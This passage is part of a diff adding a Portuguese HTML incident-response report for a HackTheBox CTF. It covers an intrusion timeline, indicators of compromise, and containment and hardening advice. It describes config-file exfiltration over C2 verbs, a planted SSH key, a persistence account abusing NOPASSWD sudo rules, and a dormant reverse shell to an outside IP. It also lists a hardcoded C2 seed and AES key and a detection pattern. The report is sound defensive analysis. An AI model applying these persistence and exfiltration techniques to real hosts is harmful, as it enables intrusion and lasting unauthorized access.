+          <p>mtime de <code>/srv/AshShare/linux_sys_updater</code> (9.258.320 bytes, PyInstaller/CPython 3.12).</p>
+        </div>
+        <div class="timeline-item hot">
+          <time>2026-05-22 18:54:32 UTC</time>
+          <strong>Primeiro BEACON</strong>
+          <p>Implante executado a partir do <code>-bash</code> da sessao SSH de <code>kingmaelor</code>;
+             registra-se como <code>ASH_CLI_nxpgkxxdatxrcbvkeqby</code> em 10.10.0.56:443.</p>
+        </div>
+        <div class="timeline-item">
+          <time>2026-05-22 18:54:35 UTC</time>
+          <strong>Coleta UAC executada</strong>
+          <p>A triagem congela o host <b>durante</b> a intrusao &mdash; por isso ela ve o processo e a
+             conexao, mas nao os artefatos escritos depois das 18:55.</p>
+        </div>
+        <div class="timeline-item hot">
+          <time>18:55:32 &rarr; 18:55:35</time>
+          <strong>Exfiltracao de configuracao</strong>
+          <p><code>DWNL_FILE /etc/ssh/sshd_config</code> e <code>DWNL_FILE /etc/hosts</code>.</p>
+        </div>
+        <div class="timeline-item hot">
+          <time>18:55:38 UTC</time>
+          <strong>Chave SSH plantada</strong>
+          <p><code>UPLD_FILE /home/kingmaelor/.ssh/authorized_keys</code> &larr; chave ed25519 <code>ash@team.htb</code>.</p>
+        </div>
+        <div class="timeline-item">
+          <time>18:55:41 &rarr; 18:55:50</time>
+          <strong>Reconhecimento local</strong>
+          <p><code>uname -a</code>, <code>ls -la /etc</code>, <code>id</code>, <code>sudo -l</code> &mdash;
+             a ultima revela as regras NOPASSWD que viabilizam o proximo passo.</p>
+        </div>
+        <div class="timeline-item hot">
+          <time>18:55:53 UTC</time>
+          <strong>Conta de persistencia criada</strong>
+          <p><code>backup_usr</code> (uid 1016) com senha <code>9cq3jPVN6Me1</code>, verificada em seguida.</p>
+        </div>
+        <div class="timeline-item hot">
+          <time>18:56:03 UTC</time>
+          <strong>Reverse shell dormente gravado</strong>
+          <p>Payload gzip+base64 cria <code>~/.local/share/.systemd-helper</code> apontando para
+             <code>141.101.64.3:53</code>. Ultima mensagem da captura.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="iocs">
+      <div class="section-head"><span class="section-index">09</span><h2>Indicadores de comprometimento</h2></div>
+
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>Tipo</th><th>Indicador</th><th>Contexto</th></tr></thead>
+        <tbody>
+          <tr><td>Arquivo</td><td class="mono">/srv/AshShare/linux_sys_updater</td><td>Implante PyInstaller</td></tr>
+          <tr><td>MD5</td><td class="mono">e1349e5c012ad89a1e543d1d6236004d</td><td>Implante</td></tr>
+          <tr><td>SHA1</td><td class="mono">c4f152d71ce2cee299fe9083f65e3437371dcb77</td><td>Implante</td></tr>
+          <tr><td>SHA256</td><td class="mono">74c2ebe9ee25ade9c9d7459278cab19c389a8963a4a477ac56f04b273c14f6d0</td><td>Implante</td></tr>
+          <tr><td>Rede</td><td class="mono">10.10.0.56:443</td><td>C2 (protocolo proprietario, sem TLS)</td></tr>
+          <tr><td>Rede</td><td class="mono">10.10.0.56 &rarr; 10.10.0.10:22</td><td>Origem da sessao SSH do atacante</td></tr>
+          <tr><td>Rede</td><td class="mono">141.101.64.3:53</td><td>Destino do reverse shell dormente</td></tr>
+          <tr><td>Arquivo</td><td class="mono">/home/kingmaelor/.local/share/.systemd-helper</td><td>Reverse shell, oculto e executavel</td></tr>
+          <tr><td>Arquivo</td><td class="mono">/home/kingmaelor/.ssh/authorized_keys</td><td>Chave ed25519 nao autorizada</td></tr>
+          <tr><td>Chave SSH</td><td class="mono">AAAAC3NzaC1lZDI1NTE5AAAAINT6AHLFJOhtGkv5YeF2xgp5GCdDBAyWCIBSxpNTKg40 (ash@team.htb)</td><td>Backdoor de acesso</td></tr>
+          <tr><td>Conta</td><td class="mono">backup_usr (uid 1016, gid 1016)</td><td>Conta plantada</td></tr>
+          <tr><td>Protocolo</td><td class="mono">BEACON / CHALLENGE / DWNL_FILE / UPLD_FILE / CMD / OUTPUT / SHUTDOWN</td><td>Verbos do C2</td></tr>
+          <tr><td>Padrao de rede</td><td class="mono">ASH_CLI_[a-z]{20}</td><td>Formato do client ID &mdash; regra de deteccao</td></tr>
+          <tr><td>Processo</td><td class="mono">comm = linux_sys_updat</td><td>Nome truncado (15 chars) do PyInstaller</td></tr>
+          <tr><td>Semente de cripto</td><td class="mono">ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j</td><td>Hardcoded &mdash; permite decriptar qualquer captura desta familia</td></tr>
+          <tr><td>Chave AES-256</td><td class="mono">9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b</td><td>Derivada da semente; MD5 = 6ffc06ff97ec037753feda5354b650b3</td></tr>
+        </tbody>
+      </table>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <section id="impacto">
+      <div class="section-head"><span class="section-index">10</span><h2>Impacto &amp; resposta recomendada</h2></div>
+
+      <div class="grid-2">
+        <div class="card">
+          <div class="label">Impacto confirmado</div>
+          <p style="margin:10px 0 0;color:var(--muted);font-size:.9rem">
+            Exfiltracao de <code>/etc/ssh/sshd_config</code> (que expoe <code>PermitRootLogin yes</code>) e
+            <code>/etc/hosts</code> (mapa de nomes internos). Execucao arbitraria de comandos como
+            <code>kingmaelor</code>, com <code>sudo ALL</code> disponivel &mdash; ou seja, comprometimento
+            efetivo de root. Tres mecanismos de retorno instalados.
+          </p>
+        </div>
+        <div class="card">
+          <div class="label">Nao observado na captura</div>
+          <p style="margin:10px 0 0;color:var(--muted);font-size:.9rem">
+            Nenhum movimento lateral, nenhuma coleta de dados de negocio, nenhuma destruicao.
+            A janela capturada cobre 91 segundos; atividade fora dela nao pode ser descartada &mdash;
+            especialmente o que trafegou pelo fluxo SSH (stream 0), que permanece cifrado.
+          </p>
+        </div>
+      </div>
+
+      <div class="callout danger">
+        <h4>Contencao imediata</h4>
+        <p>
+          1) Isolar <code>ash-wbsrv03</code> da rede. &nbsp;2) Matar PIDs 99/100 e remover
+          <code>/srv/AshShare/linux_sys_updater</code>. &nbsp;3) Apagar
+          <code>/home/kingmaelor/.local/share/.systemd-helper</code> e a chave estranha em
+          <code>authorized_keys</code>. &nbsp;4) <code>userdel -r backup_usr</code>. &nbsp;5) Rotacionar
+          a senha de <code>kingmaelor</code> e de todas as 16 contas do host &mdash; os hashes yescrypt
+          estavam ao alcance do atacante via <code>sudo</code>.
+        </p>
+      </div>
+
+      <div class="callout">
+        <h4>Correcao estrutural</h4>
+        <p>
+          A regra <code>(ALL) NOPASSWD: /usr/sbin/useradd, /usr/sbin/usermod, /usr/sbin/chpasswd</code> e o
+          que transformou um acesso de usuario em persistencia permanente sem nenhuma prova de senha.
+          Remover essa entrada, desativar <code>PermitRootLogin</code>, exigir chave + MFA no SSH, e
+          alertar em: conexoes de saida para 443 sem handshake TLS, processos com <code>_MEIPASS</code> no
+          ambiente, e escrita em <code>~/.ssh/authorized_keys</code>.
+        </p>
+      </div>
+
+      <div class="callout info">
+        <h4>Licao de aquisicao</h4>
+        <p>
+          A coleta UAC rodou no meio da intrusao e por isso <b>nao contem</b> os dois artefatos mais
+          incriminadores (a chave SSH e o <code>.systemd-helper</code>). Sem o pcap, esses passos seriam
+          invisiveis. Captura de rede e triagem de disco sao complementares &mdash; nenhuma das duas basta.
+        </p>
+      </div>
+    </section>
+
+    <footer>
+      Relatorio gerado para CTF autorizado (HackTheBox) &mdash; The Ash-Binder Signature &middot;
+      host ash-wbsrv03 (10.10.0.10) &middot; artefatos: capture.pcap + uac-ash-wbsrv03-linux-20260522185435.tar.gz &middot;
+      11/11 flags resolvidas &middot; analise offline, binario nao executado.
+    </footer>
+
+  </main>
+</div>
+
+<script>
+  const links = [...document.querySelectorAll('nav a')];
+  const sections = links.map(a => document.querySelector(a.getAttribute('href')));
+  const io = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (!e.isIntersecting) return;
+      const i = sections.indexOf(e.target);
+      links.forEach(l => l.classList.remove('active'));
+      if (i > -1) links[i].classList.add('active');
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => s && io.observe(s));
+</script>
+</body>
+</html>
